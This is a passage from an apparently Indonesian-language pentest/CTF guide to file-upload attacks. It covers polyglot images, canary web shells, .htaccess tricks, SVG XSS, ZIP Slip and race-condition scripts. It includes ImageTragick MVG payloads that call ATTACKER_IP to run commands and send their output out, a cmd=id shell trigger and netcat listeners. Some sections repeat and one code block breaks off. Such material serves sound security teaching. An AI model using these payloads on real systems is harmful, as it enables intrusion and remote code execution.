printf '\xFF\xD8\xFF' > polyglot.jpg.php
printf '%s\n' '<?php echo "UPLOAD_OK"; ?>' >> polyglot.jpg.php
```

Cek:

```bash
xxd -l 32 polyglot.jpg.php
```

dan:

```bash
file polyglot.jpg.php
```

**Catatan:** ini belum tentu merupakan JPEG valid. Validator yang melakukan decoding JPEG akan menolaknya.

---

## ExifTool

Untuk lab tertentu, metadata dapat digunakan untuk menyisipkan data:

```bash
exiftool -Comment='<?php echo "UPLOAD_OK"; ?>' image.jpg
```

Kemudian:

```bash
exiftool image.jpg | grep Comment
```

Namun:

```text
metadata injection ≠ automatic PHP execution
```

Server harus memiliki vulnerability/path yang membuat data tersebut dieksekusi atau diproses secara berbahaya.

---

### 📌 Kapan Digunakan

Gunakan polyglot ketika:

```text
extension = image
MIME = image/*
magic bytes = image
```

tetapi masih ada kemungkinan parser/application memproses content tambahan.

---

# 2.7 ImageTragick — Parser Attack Example

### 📌 Kapan Digunakan

Gunakan ketika target menggunakan **ImageMagick** untuk image processing (resize, convert, thumbnail generation).

### Vulnerability: CVE-2016-3714

ImageMagick memiliki vulnerability yang allow RCE via crafted image file dengan extension MVG atau MSL.

### Konsep

1. Upload file dengan magic bytes valid image (PNG/JPG)
2. Content adalah MVG/MSL payload
3. ImageMagick process file → execute command

### Payload MVG untuk RCE

```bash
# Buat exploit.mvg
cat > exploit.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://ATTACKER_IP:8000/|id)'
pop graphic-context
EOF

# Alternative: SSRF + exfiltration
cat > exploit.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://ATTACKER_IP:8000/$(whoami)'
pop graphic-context
EOF
```

### Upload dengan Filename Spoofing

```bash
# Upload dengan extension .jpg tapi content MVG
curl -i \
  -F 'file=@exploit.mvg;filename=exploit.jpg;type=image/jpeg' \
  http://TARGET/upload.php
```

### Monitoring di Attacker

```bash
# Setup listener untuk catch callback
python3 -m http.server 8000

# Atau netcat
nc -lvnp 8000
```

### Expected Behavior

Jika vulnerable:
- ImageMagick akan process exploit.mvg
- Execute command dalam `url()` atau `image`
- Attacker dapat HTTP callback dengan command output

### Detection

```bash
# Cari indikasi ImageMagick di response headers
curl -I http://TARGET/uploads/image.jpg | grep -i "imagemagick\|convert"

# Atau test dengan SSRF payload terlebih dahulu
```

### Modern Mitigation

ImageMagick modern versions sudah patch CVE-2016-3714, tapi **masih bisa vulnerable jika:**
- Versi lama (< 7.0.1-0)
- Policy tidak configured properly
- Custom delegates enabled

### Testing di Lab

```bash
# Test apakah ImageMagick process upload:
# 1. Upload normal image
# 2. Check apakah di-resize/convert
# 3. Jika ya → test ImageTragick payload
```

### References

- [ImageTragick Official Site](https://imagetragick.com/)
- [CVE-2016-3714 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714)

> **Note:** Ini adalah contoh **parser attack** dimana vulnerability ada di library processing (ImageMagick), bukan di application code.

---

# 3 — Bypass Advanced **setelah execution sudah terbukti**.

Urutan yang lebih baik:

```text
Upload
  ↓
Execution proof
  ↓
Command execution
  ↓
Reverse shell
```

Jangan langsung debugging reverse shell ketika sebenarnya:

```text
PHP belum dieksekusi
```

---

# 2.3 ASP/ASPX Shell

## Classic ASP

Untuk IIS/Classic ASP lab:

```asp
<%
Response.Write("UPLOAD_OK")
%>
```

Simpan:

```text
test.asp
```

Upload:

```bash
curl -i \
  -F 'file=@test.asp;filename=test.asp' \
  http://TARGET/upload.php
```

Trigger:

```bash
curl -i http://TARGET/uploads/test.asp
```

---

## ASPX

Minimal test:

```aspx
<%@ Page Language="C#" %>
<%
Response.Write("UPLOAD_OK");
%>
```

Simpan:

```text
test.aspx
```

---

### 📌 Kapan Digunakan

Gunakan jika fingerprinting menunjukkan:

```text
IIS
ASP.NET
Classic ASP
```

---

# 2.4 JSP Shell

Minimal JSP:

```jsp
<%
out.println("UPLOAD_OK");
%>
```

Simpan:

```text
test.jsp
```

Upload:

```bash
curl -i \
  -F 'file=@test.jsp;filename=test.jsp' \
  http://TARGET/upload.php
```

Trigger:

```bash
curl -i http://TARGET/uploads/test.jsp
```

---

### 📌 Kapan Digunakan

Gunakan ketika target menunjukkan:

```text
Tomcat
Jetty
JSP
Java servlet container
```

---

# 2.5 Image Polyglot

## Apa Itu Polyglot?

Polyglot adalah file yang sengaja dibuat valid atau cukup valid menurut lebih dari satu parser/interpretasi.

Concept:

```text
Image parser
      +
PHP parser
```

---

## GIF Example

```bash
printf 'GIF89a\n' > polyglot.gif.php
printf '<?php echo "UPLOAD_OK"; ?>\n' >> polyglot.gif.php
```

Cek:

```bash
xxd -l 32 polyglot.gif.php
```

Expected:

```text
47 49 46 38 39 61
```

---

## Upload

```bash
curl -i \
  -F 'file=@polyglot.gif.php;filename=polyglot.gif.php;type=image/gif' \
  http://TARGET/upload.php
```

---

## JPG + PHP

Membuat file dengan header JPEG saja:

```bash
printf '\xFF\xD8\xFF' > polyglot.jpg.php
printf '%s\n' '<?php echo "UPLOAD_OK"; ?>' >> polyglot.jpg.php
```

Cek:

```bash
xxd -l 32 polyglot.jpg.php
```

dan:

```bash
file polyglot.jpg.php
```

**Catatan:** ini belum tentu merupakan JPEG valid. Validator yang melakukan decoding JPEG akan menolaknya.

---

## ExifTool

Untuk lab tertentu, metadata dapat digunakan untuk menyisipkan data:

```bash
exiftool -Comment='<?php echo "UPLOAD_OK"; ?>' image.jpg
```

Kemudian:

```bash
exiftool image.jpg | grep Comment
```

Namun:

```text
metadata injection ≠ automatic PHP execution
```

Server harus memiliki vulnerability/path yang membuat data tersebut dieksekusi atau diproses secara berbahaya.

---

### 📌 Kapan Digunakan

Gunakan polyglot ketika:

```text
extension = image
MIME = image/*
magic bytes = image
```

tetapi masih ada kemungkinan parser/application memproses content tambahan.

---

# 3 — Bypass Advanced

# 3.1 `.htaccess` Upload — Apache

`.htaccess` dapat mengubah behavior Apache jika:

```text
AllowOverride
```

mengizinkannya.

Contoh konfigurasi lab:

```apache
AddType application/x-httpd-php .jpg
```

Artinya:

```text
.jpg
  ↓
Apache treats as PHP
```

---

## Buat `.htaccess`

```bash
printf '%s\n' \
  'AddType application/x-httpd-php .jpg' \
  > .htaccess
```

Cek:

```bash
cat .htaccess
```

Expected:

```text
AddType application/x-httpd-php .jpg
```

---

## Buat JPG berisi PHP

```bash
printf '%s\n' \
  '<?php echo "HTACCESS_OK"; ?>' \
  > shell.jpg
```

---

## Upload `.htaccess`

```bash
curl -i \
  -F 'file=@.htaccess;filename=.htaccess' \
  http://TARGET/upload.php
```

---

## Upload JPG

```bash
curl -i \
  -F 'file=@shell.jpg;filename=shell.jpg;type=image/jpeg' \
  http://TARGET/upload.php
```

---

## Trigger

```bash
curl -i http://TARGET/uploads/shell.jpg
```

Jika konfigurasi berlaku:

```text
HTACCESS_OK
```

---

### 📌 Kapan Digunakan

Prioritaskan ketika:

```text
Apache
```

dan:

```text
.htaccess dapat di-upload
```

serta upload directory memungkinkan override configuration.

---

## Kenapa Bisa Gagal?

Kemungkinan:

```text
AllowOverride None
.htaccess disabled
upload directory bukan Apache filesystem
filename .htaccess diblok
Apache tidak menjalankan PHP
PHP-FPM mapping berbeda
directory configuration override tidak mengizinkan AddType
```

---

# 3.2 SVG Upload XSS

SVG adalah XML-based image format.

Contoh lab:

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     onload="alert('SVG_XSS')">
</svg>
```

Simpan:

```bash
cat > xss.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg"
     onload="alert('SVG_XSS')">
</svg>
EOF
```

Upload:

```bash
curl -i \
  -F 'file=@xss.svg;filename=xss.svg;type=image/svg+xml' \
  http://TARGET/upload.php
```

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
SVG diterima
```

dan file:

```text
dapat diakses browser
```

serta response headers/content policy memungkinkan SVG diproses sebagai active content.

Impact:

```text
Stored XSS
```

---

# 3.3 ZIP Slip

ZIP Slip terjadi ketika aplikasi mengekstrak archive tanpa melakukan canonical path validation.

Contoh malicious path:

```text
../../target.txt
```

Konsep:

```text
archive.zip
└── ../../target.txt
```

Ketika extractor vulnerable:

```text
extract()
   ↓
../../target.txt
   ↓
outside extraction directory
```

---

## Buat ZIP Lab

Dengan Python:

```bash
python3 - <<'PY'
from zipfile import ZipFile

with ZipFile("slip.zip", "w") as z:
    z.writestr("../../zip-slip-test.txt", "ZIP_SLIP_TEST\n")
PY
```

Inspect:

```bash
unzip -l slip.zip
```

Expected:

```text
../../zip-slip-test.txt
```

---

## Upload

```bash
curl -i \
  -F 'file=@slip.zip;filename=slip.zip;type=application/zip' \
  http://TARGET/upload.php
```

---

### 📌 Kapan Digunakan

Gunakan ketika aplikasi:

```text
menerima ZIP
```

dan kemudian:

```text
extract
import
restore
unpack
```

archive tersebut.

**Dalam CTF, perhatikan extraction path yang diberikan challenge. Jangan menargetkan file sistem pada lingkungan yang bukan lab.**

---

# 3.4 Race Condition Upload

Konsep:

```text
Upload
   ↓
Temporary storage
   ↓
Validation
   ↓
Move
   ↓
Delete
```

Race condition terjadi jika attacker dapat mengakses file pada window:

```text
UPLOAD
  │
  ├── file exists
  │
  ├── validation
  │
  ├── DELETE
  │
  └── file gone
```

Jika execution terjadi sebelum deletion:

```text
UPLOAD
  ↓
EXECUTE
  ↓
DELETE
```

echo "[*] Race test finished"
```

Script ini:

```text
tidak menjalankan command execution
```

dan hanya melakukan request terhadap endpoint yang diberikan.

---

### Script yang Lebih Efektif untuk True Race Condition

Script di atas menggunakan `wait` yang menunggu semua job selesai sebelum next iteration. Untuk **true parallel race condition**, gunakan script ini:

```bash
#!/bin/bash

FILE="shell.gif.php"
UPLOAD_URL="http://TARGET/upload.php"
TARGET_URL="http://TARGET/uploads/shell.gif.php"

echo "[*] Starting TRUE race condition attack"
echo "[*] Upload URL: $UPLOAD_URL"
echo "[*] Target URL: $TARGET_URL"

# Upload 50x parallel (NO wait dalam loop upload)
echo "[*] Launching 50 parallel uploads..."
for i in $(seq 1 50); do
    curl -sS \
        -F "file=@${FILE}" \
        "$UPLOAD_URL" \
        >/dev/null 2>&1 &
done

echo "[*] Uploads started, now polling target 100x..."

# Sambil upload berjalan, polling target_url
for i in $(seq 1 100); do
    RESPONSE=$(curl -sS "$TARGET_URL" 2>/dev/null)
    
    if echo "$RESPONSE" | grep -q "UPLOAD_OK"; then
        echo "[!] ====================================="
        echo "[!] RACE CONDITION SUCCEEDED!"
        echo "[!] ====================================="
        echo "$RESPONSE"
        break
    fi
    
    # Small delay between polls (50ms)
    sleep 0.05
done

# Wait for all background jobs to finish
wait

echo "[*] Race condition attempts completed"
```

**Perbedaan:**
- Upload loop **TIDAK ada `wait`** → semua upload benar-benar parallel
- Polling dilakukan **sambil** upload berjalan
- Lebih tinggi chance untuk hit race window
```

Contoh:

```text
Check file
   ↓
attacker changes state
   ↓
Application uses file
```

---

### 📌 Kapan Digunakan

Gunakan ketika source/request behavior menunjukkan:

```text
temporary upload
validation
rename/move
delete
```

dengan timing yang dapat diamati.

---

## Race Test Script

```bash
#!/usr/bin/env bash

set -u

usage() {
    echo "Usage: $0 <upload_url> <file> <target_url>"
    exit 1
}

[[ $# -eq 3 ]] || usage

UPLOAD_URL="$1"
FILE="$2"
TARGET_URL="$3"

if [[ "$UPLOAD_URL" != http://* && "$UPLOAD_URL" != https://* ]]; then
    echo "[!] Invalid upload URL"
    exit 1
fi

if [[ "$TARGET_URL" != http://* && "$TARGET_URL" != https://* ]]; then
    echo "[!] Invalid target URL"
    exit 1
fi

if [[ ! -f "$FILE" ]]; then
    echo "[!] File does not exist: $FILE"
    exit 1
fi

command -v curl >/dev/null 2>&1 || {
    echo "[!] curl is required"
    exit 1
}

echo "[*] Starting race test"
echo "[*] Upload: $UPLOAD_URL"
echo "[*] File:   $FILE"
echo "[*] Target: $TARGET_URL"

for i in $(seq 1 20); do
    curl -sS \
        -F "file=@${FILE}" \
        "$UPLOAD_URL" \
        >/dev/null &

    curl -sS \
        "$TARGET_URL" \
        >/dev/null &

    wait

    echo "[+] Attempt $i completed"
done

echo "[*] Race test finished"
```

Script ini:

```text
tidak menjalankan command execution
```

dan hanya melakukan request terhadap endpoint yang diberikan.

---

# 3.5 Upload via API

## Multipart API

```bash
curl -i \
  -X POST \
  -F 'file=@test.php;filename=test.php' \
  https://TARGET/api/upload
```

---

## JSON API

Beberapa API tidak menggunakan multipart.

Contoh struktur:

```json
{
  "filename": "test.txt",
  "content": "hello"
}
```

Request:

```bash
curl -i \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"filename":"test.txt","content":"hello"}' \
  https://TARGET/api/upload
```

---

## GraphQL Upload

Cari:

```text
/graphql
```

atau request yang memiliki:

```text
operations
map
file
```

GraphQL multipart upload umumnya memiliki struktur multipart khusus.

Inspect request dengan Burp sebelum mencoba memodifikasi.

---

### 📌 Kapan Digunakan

Gunakan ketika UI frontend hanya menjadi wrapper API.

Cari:

```text
/api/upload
/api/files
/api/media
/graphql
```

---

# 4 — Path Prediction & Execution

# 4.1 Cara Prediksi Path Upload

Perhatikan response.

Contoh:

```json
{
  "uploaded": true,
  "path": "/uploads/avatar123.jpg"
}
```

Maka kandidat:

```text
http://TARGET/uploads/avatar123.jpg
```

---

## Common Upload Directories

```text
/uploads/
/upload/
/files/
/media/
/static/uploads/
/assets/
/images/
/attachments/
/documents/
```

---

## ffuf

Gunakan wordlist directory yang tersedia di Parrot.

Contoh:

```bash
ffuf \
  -u http://TARGET/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,204,301,302,307,401,403
```

Untuk path upload:

```bash
ffuf \
  -u http://TARGET/FUZZ/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,204,301,302,307,401,403
```

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
upload success
```

tetapi:

```text
application tidak memberi public URL
```

---

# 4.2 Trigger Execution

Setelah mengetahui path:

```bash
curl -i http://TARGET/uploads/test.php
```

Jika payload:

```php
<?php echo "UPLOAD_OK"; ?>
```

response:

```text
HTTP/1.1 200 OK

UPLOAD_OK
```

Maka:

```text
PHP execution = CONFIRMED
```

---

## Jika Command Shell

```bash
curl -G \
  --data-urlencode 'cmd=id' \
  http://TARGET/uploads/cmd.php
```

---

### 📌 Kapan Digunakan

Gunakan setelah:

```text
upload berhasil
+
public path diketahui
```

---

# 4.3 Upload + LFI Combo

Ini merupakan kombinasi penting.

Flow:

```text
Upload file
     ↓
file disimpan
     ↓
file tidak executable secara langsung
     ↓
LFI vulnerability
     ↓
application include uploaded file
     ↓
PHP interpreter memproses file
```

Contoh payload:

```php
<?php echo "LFI_UPLOAD_OK"; ?>
```

Upload:

```bash
curl -i \
  -F 'file=@test.php;filename=test.php' \
  http://TARGET/upload.php
```

Misalnya response:

```text
/uploads/test.php
```

Kemudian LFI:

```text
/index.php?page=/uploads/test.php
```

Dengan curl:

```bash
curl -G \
  --data-urlencode 'page=/uploads/test.php' \
  http://TARGET/index.php
```

Jika response:

```text
LFI_UPLOAD_OK
```

maka:

```text
Upload + LFI confirmed
```

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
uploaded PHP tidak execute langsung
```

tetapi target juga memiliki:

```text
LFI
```

Lihat:

← [File 24: LFI/RFI](/docs/lfi-rfi)

---

# 5 — Tools & Automation

# 5.1 Manual Testing dengan curl

## Basic Upload

```bash
curl -i \
  -F 'file=@test.txt' \
  http://TARGET/upload.php
```

---

## Custom Filename

```bash
curl -i \
  -F 'file=@test.php;filename=shell.php' \
  http://TARGET/upload.php
```

---

## Custom MIME

```bash
curl -i \
  -F 'file=@test.php;filename=shell.php;type=image/jpeg' \
  http://TARGET/upload.php
```

---

## Verify

```bash
curl -i \
  http://TARGET/uploads/shell.php
```

---

## Save Response

```bash
curl -i \
  -o response.txt \
  http://TARGET/uploads/shell.php
```

---

### 📌 Kapan Digunakan

`curl` digunakan untuk:

```text
repeatable testing
automation
request comparison
debugging
```

Keuntungan:

```text
Burp = visual/manual manipulation
curl = repeatability
```

---

# 5.2 Burp Suite untuk Upload Testing

Workflow:

```text
Browser
   ↓
Upload file
   ↓
Burp Proxy
   ↓
Intercept
   ↓
Send to Repeater
   ↓
Modify
   ├── filename
   ├── extension
   ├── MIME
   ├── content
   └── parameters
   ↓
Send
   ↓
Observe response
```

---

## Test Filename

Original:

```http
filename="test.jpg"
```

ubah:

```http
filename="test.php"
```

---

## Test MIME

Original:

```http
Content-Type: image/jpeg
```

ubah:

```http
Content-Type: application/x-php
```

atau sebaliknya untuk menguji apakah server hanya memercayai client-supplied MIME.

---

## Test Content

Original:

```text
real image
```

ubah menjadi lab payload:

```php
<?php echo "UPLOAD_OK"; ?>
```

---

## Intruder

Intruder dapat digunakan untuk fuzz filename/extension.

Payload list:

```text
php
phtml
php3
php4
php5
php7
phar
jsp
jspx
asp
aspx
```

Target:

```http
filename="test.§php§"
```

Perhatikan:

```text
HTTP status
response length
error message
redirect
response body
```

---

### 📌 Kapan Digunakan

Gunakan Burp ketika:

```text
request multipart kompleks
```

atau ketika:

```text
curl sulit mereproduksi exact request
```

---

# 5.3 Script `upload_test.sh`

Script berikut sengaja berfokus pada **upload/validation testing**, bukan automatic RCE.

## Script

```bash
#!/usr/bin/env bash

set -u

usage() {
    cat <<EOF
Usage:
  $0 <upload_url> <file>

Example:
  $0 http://TARGET/upload.php test.php
EOF
    exit 1
}

# -----------------------------
# Argument validation
# -----------------------------

if [[ $# -ne 2 ]]; then
    usage
fi

UPLOAD_URL="$1"
BASE_FILE="$2"

# URL validation
if [[ "$UPLOAD_URL" != http://* &&
      "$UPLOAD_URL" != https://* ]]; then
    echo "[!] Invalid URL."
    echo "[!] URL must begin with http:// or https://"
    exit 1
fi

# File validation
if [[ ! -f "$BASE_FILE" ]]; then
    echo "[!] File does not exist: $BASE_FILE"
    exit 1
fi

if [[ ! -r "$BASE_FILE" ]]; then
    echo "[!] File is not readable: $BASE_FILE"
    exit 1
fi

# Dependency validation
if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is required."
    exit 1
fi

if ! command -v file >/dev/null 2>&1; then
    echo "[!] file command is required."
    exit 1
fi

echo "========================================"
echo " File Upload Validation Tester"
echo "========================================"
echo "[*] Target : $UPLOAD_URL"
echo "[*] File   : $BASE_FILE"
echo "[*] Type   : $(file -b "$BASE_FILE")"
echo

# -----------------------------
# Helper function
# -----------------------------

test_upload() {
    local label="$1"
    local filename="$2"
    local mime="$3"

    echo "[*] TEST: $label"
    echo "    filename = $filename"
    echo "    MIME     = $mime"

    response="$(
        curl -sS \
            -o /tmp/upload_test_response.$$ \
            -w '%{http_code}' \
            -F "file=@${BASE_FILE};filename=${filename};type=${mime}" \
            "$UPLOAD_URL"
    )"

    curl_exit=$?

    if [[ $curl_exit -ne 0 ]]; then
        echo "    RESULT   = REQUEST_ERROR"
        echo "    curl exit code = $curl_exit"
        echo
        return
    fi

    echo "    HTTP     = $response"

    if [[ "$response" =~ ^2[0-9][0-9]$ ]]; then
        echo "    RESULT   = ACCEPTED/PROCESSING"
    elif [[ "$response" =~ ^4[0-9][0-9]$ ]]; then
        echo "    RESULT   = REJECTED"
    elif [[ "$response" =~ ^5[0-9][0-9]$ ]]; then
        echo "    RESULT   = SERVER_ERROR"
    else
        echo "    RESULT   = UNKNOWN"
    fi

    echo "    Response preview:"
    head -c 300 /tmp/upload_test_response.$$ 2>/dev/null
    echo
    echo
}

# -----------------------------
# Extension tests
# -----------------------------

test_upload \
    "PHP extension" \
    "upload-test.php" \
    "application/x-php"

test_upload \
    "PHTML extension" \
    "upload-test.phtml" \
    "application/x-php"

test_upload \
    "PHP5 extension" \
    "upload-test.php5" \
    "application/x-php"

test_upload \
    "PHP3 extension" \
    "upload-test.php3" \
    "application/x-php"

test_upload \
    "PHAR extension" \
    "upload-test.phar" \
    "application/x-php"

# -----------------------------
# MIME bypass test
# -----------------------------

test_upload \
    "PHP filename + image/jpeg MIME" \
    "upload-test.php" \
    "image/jpeg"

# -----------------------------
# Magic-byte test
# -----------------------------

MAGIC_FILE="/tmp/upload_magic_test.$$"

{
    printf '\xFF\xD8\xFF'
    cat "$BASE_FILE"
} > "$MAGIC_FILE"

test_upload \
    "JPEG magic bytes + original content" \
    "upload-test.php" \
    "image/jpeg"

rm -f "$MAGIC_FILE"
rm -f "/tmp/upload_test_response.$$"

echo "========================================"
echo " Testing finished"
echo "========================================"
echo
echo "[!] This script does NOT execute uploaded files."
echo "[!] Verify execution manually only inside your authorized lab."
```

---

## Permission

```bash
chmod +x upload_test.sh
```

Run:

```bash
./upload_test.sh \
  http://TARGET/upload.php \
  test.php
```

---

## Contoh Output Realistis

```text
========================================
 File Upload Validation Tester
========================================
[*] Target : http://10.10.10.50/upload.php
[*] File   : test.php
[*] Type   : PHP script, ASCII text

[*] TEST: PHP extension
    filename = upload-test.php
    MIME     = application/x-php
    HTTP     = 400
    RESULT   = REJECTED
    Response preview:
    {"error":"File type not allowed"}

[*] TEST: PHTML extension
    filename = upload-test.phtml
    MIME     = application/x-php
    HTTP     = 200
    RESULT   = ACCEPTED/PROCESSING
    Response preview:
    {"success":true,"filename":"upload-test.phtml"}

[*] TEST: PHP5 extension
    filename = upload-test.php5
    MIME     = application/x-php
    HTTP     = 400
    RESULT   = REJECTED
    Response preview:
    {"error":"File type not allowed"}

[*] TEST: PHP filename + image/jpeg MIME
    filename = upload-test.php
    MIME     = image/jpeg
    HTTP     = 400
    RESULT   = REJECTED
    Response preview:
    {"error":"Invalid extension"}

[*] TEST: JPEG magic bytes + original content
    filename = upload-test.php
    MIME     = image/jpeg
    HTTP     = 400
    RESULT   = REJECTED
    Response preview:
    {"error":"Invalid extension"}

========================================
 Testing finished
========================================

[!] This script does NOT execute uploaded files.
[!] Verify execution manually only inside your authorized lab.
```

### 📌 Kapan Digunakan

Gunakan script ini setelah menemukan upload endpoint dan ingin memperoleh baseline:

```text
.php       → ?
.phtml     → ?
.php5      → ?
MIME fake  → ?
magic byte → ?
```

---

# 6 — Decision Tree Lengkap

## MASTER FILE UPLOAD DECISION TREE

```text
                    ┌─────────────────────┐
                    │ File Upload Found   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Upload harmless     │
                    │ test file           │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Read response       │
                    │ path / filename /   │
                    │ URL / error         │
                    └──────────┬──────────┘
                               │
                               ▼
                 ┌──────────────────────────┐
                 │ Test PHP directly        │
                 │ with UPLOAD_OK payload   │
                 └────────────┬─────────────┘
                              │
                ┌─────────────┴─────────────┐
                │                           │
                ▼                           ▼
        EXECUTION YES                EXECUTION NO
                │                           │
                ▼                           ▼
        ┌──────────────┐          ┌───────────────────┐
        │ RCE path     │          │ Extension bypass? │
        │ confirmed    │          └─────────┬─────────┘
        └──────┬───────┘                    │
               │                  ┌─────────┴─────────┐
               │                  │                   │
               │                 YES                  NO
               │                  │                   │
               │                  ▼                   ▼
               │        ┌─────────────────┐   ┌──────────────────┐
               │        │ .phtml/.php5/   │   │ MIME bypass?     │
               │        │ .phar/etc       │   └────────┬─────────┘
               │        └────────┬────────┘            │
               │                 │            ┌────────┴────────┐
               │                 │            │                 │
               │                FAIL         YES                NO
               │                 │            │                 │
               │                 │            ▼                 ▼
               │                 │    ┌──────────────┐   ┌──────────────┐
               │                 │    │ image/jpeg   │   │ Magic bytes? │
               │                 │    │ + PHP        │   └──────┬───────┘
               │                 │    └──────┬───────┘          │
               │                 │           │          ┌───────┴──────┐
               │                 │          FAIL       │              │
               │                 │           │        YES             NO
               │                 │           │         │               │
               │                 │           │         ▼               ▼
               │                 │           │  ┌─────────────┐ ┌──────────────┐
               │                 │           │  │ GIF89a +    │ │ .htaccess?   │
               │                 │           │  │ PHP         │ └──────┬───────┘
               │                 │           │  └──────┬──────┘        │
               │                 │           │         │        ┌───────┴──────┐
               │                 │           │        FAIL      │              │
               │                 │           │         │       YES             NO
               │                 │           │         │        │               │
               │                 │           │         │        ▼               ▼
               │                 │           │         │ ┌─────────────┐ ┌──────────────┐
               │                 │           │         │ │ AddType     │ │ Race         │
               │                 │           │         │ │ .jpg→PHP    │ │ condition?   │
               │                 │           │         │ └──────┬──────┘ └──────┬───────┘
               │                 │           │         │        │                │
               │                 │           │         │       FAIL              │
               │                 │           │         │        │        ┌───────┴──────┐
               │                 │           │         │        │       YES             NO
               │                 │           │         │        │        │               │
               │                 │           │         │        │        ▼               ▼
               │                 │           │         │        │  ┌──────────────┐ ┌──────────────┐
               │                 │           │         │        │  │ Upload →     │ │ Non-executable│
               │                 │           │         │        │  │ Execute Race │ │ Storage      │
               │                 │           │         │        │  └──────┬───────┘ └──────┬───────┘
               │                 │           │         │        │         │                │
               │                 │           │         │        │         │        ┌───────┴────────┐
               │                 │           │         │        │         │        │                │
               │                 │           │         │        │         │        ▼                ▼
               │                 │           │         │        │         │   LFI + Upload     ZIP Slip
               │                 │           │         │        │         │        │                │
               │                 │           │         │        │         │        ▼                ▼
               │                 │         END        END      END     Include file       Path Traversal
               │                 │
               ▼
        ┌───────────────────┐
        │ Verify with curl  │
        │ /uploads/shell    │
        └─────────┬─────────┘
                  │
                  ▼
        ┌───────────────────┐
        │ Confirm command    │
        │ execution with id │
        └─────────┬─────────┘
                  │
                  ▼
        ┌───────────────────┐
        │ Reverse shell if  │
        │ required by lab   │
        └───────────────────┘
```

---

# 7 — Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|File extension not allowed|Extension masuk blacklist/whitelist|Test extension alternatif yang relevan|
|File type not allowed|MIME/content validation|Inspect server-side validation|
|File size too large|Size limit|Gunakan file kecil untuk testing|
|Upload success tapi 403|Directory access denied|Cek URL/path dan permissions|
|Upload success tapi file tidak dieksekusi|Storage non-executable|Test LFI/processing behavior|
|PHP executed tapi output kosong|Payload/error|Gunakan `UPLOAD_OK` terlebih dahulu|
|Reverse shell gagal|PHP belum execute / callback blocked|Prove command execution dulu|
|Race condition gagal|Window terlalu kecil|Analisis timing dan behavior endpoint|
|`.htaccess` ditolak|Dotfile blocked|Periksa validation/configuration|
|`.htaccess` diterima tapi tidak bekerja|`AllowOverride`/handler|Apache config tidak mengizinkan override|
|Magic bytes tidak membantu|Validator decode file|Buat file image valid atau cari logic lain|
|Path prediction salah|Filename randomized|Baca response/source/headers|
|Double extension gagal|Server membaca extension terakhir|Cari parser discrepancy|
|Null byte gagal|Modern stack melakukan sanitization|Anggap teknik legacy|
|Case bypass gagal|Server case-sensitive|Identifikasi OS/server behavior|
|`.php5` gagal|Handler tidak memetakan extension|Coba hanya extension yang relevan|
|`.phtml` berhasil upload tapi tidak execute|PHP handler tidak memetakan `.phtml`|Bedakan upload acceptance vs execution|
|SVG upload berhasil tetapi XSS tidak|Browser/header/content handling|Cek `Content-Type` dan `Content-Disposition`|
|ZIP Slip tidak berhasil|Extractor melakukan canonicalization|Analisis extraction implementation|
|Upload URL membutuhkan authentication|File private|Pertahankan session/cookie saat testing|
|curl mendapat 302|Authentication/redirect|Gunakan `-L` dengan hati-hati|
|curl mendapat 401|Authentication required|Gunakan cookie/session lab|
|curl mendapat 403|Authorization/path restriction|Verifikasi endpoint dan permissions|
|curl mendapat 413|Request terlalu besar|Gunakan file lebih kecil|
|curl mendapat 415|Unsupported media type|Inspect expected MIME|
|curl mendapat 500|Parser/server error|Baca response dan test file benign|
|Filename berubah|Server randomizes filename|Gunakan response sebagai source of truth|
|File hilang setelah upload|Temporary storage/cleanup|Cari processing pipeline|
|File otomatis di-reencode|Image processing|Polyglot sederhana kemungkinan gagal|
|File dapat didownload tetapi tidak execute|Static storage|Cari LFI/processing sink|
|`file` menunjukkan PHP bukan image|Magic bytes/content tidak valid|Buat format file yang benar bila diperlukan|

---

# 8 — Golden Rules

## Rule 1 — Upload ≠ RCE

Jangan berpikir:

```text
Upload PHP = RCE
```

Yang benar:

```text
Upload PHP
    ↓
Stored?
    ↓
Accessible?
    ↓
Executable?
    ↓
Executed?
    ↓
RCE
```

---

## Rule 2 — Selalu Gunakan Canary Terlebih Dahulu

Mulai:

```php
<?php echo "UPLOAD_OK"; ?>
```

Bukan langsung:

```text
reverse shell
```

Tujuannya mengisolasi masalah.

---

## Rule 3 — Bedakan 4 Status

Selalu bedakan:

```text
REJECTED
ACCEPTED
STORED
EXECUTED
```

Contoh:

```text
test.php
↓
HTTP 200
```

tidak berarti:

```text
PHP executed
```

Mungkin hanya:

```text
file accepted
```

---

## Rule 4 — Validation ≠ Execution

Ada dua pertanyaan berbeda:

```text
Apakah file diterima?
```

dan:

```text
Apakah file dijalankan?
```

Jangan mencampurkannya.

---

## Rule 5 — Jangan Percaya Extension Saja

Periksa:

```text
extension
MIME
magic bytes
actual file structure
storage
server handler
```

---

## Rule 6 — Jangan Percaya MIME Saja

```http
Content-Type: image/jpeg
```

tidak membuktikan file adalah JPEG.

---

## Rule 7 — Jangan Menganggap Semua Bypass Masih Berfungsi

Teknik seperti:

```text
null byte
.php3
.php4
.php5
.php7
double extension
trailing dot
```

sangat tergantung:

```text
OS
web server
language runtime
framework
handler mapping
validation implementation
```

Gunakan evidence dari target, bukan hafalan semata.

---

## Rule 8 — Response adalah Evidence

Catat:

```text
HTTP status
response body
filename
path
redirect
Location header
Set-Cookie
Content-Type
```

Contoh:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "filename": "a8f91.php",
  "url": "/uploads/a8f91.php"
}
```

Itu jauh lebih berguna daripada sekadar:

```text
Upload berhasil.
```

---

## Rule 9 — Storage Location Sangat Penting

Tanyakan:

```text
Di mana file disimpan?
```

Karena:

```text
web root
≠
non-web storage
≠
temporary directory
≠
object storage
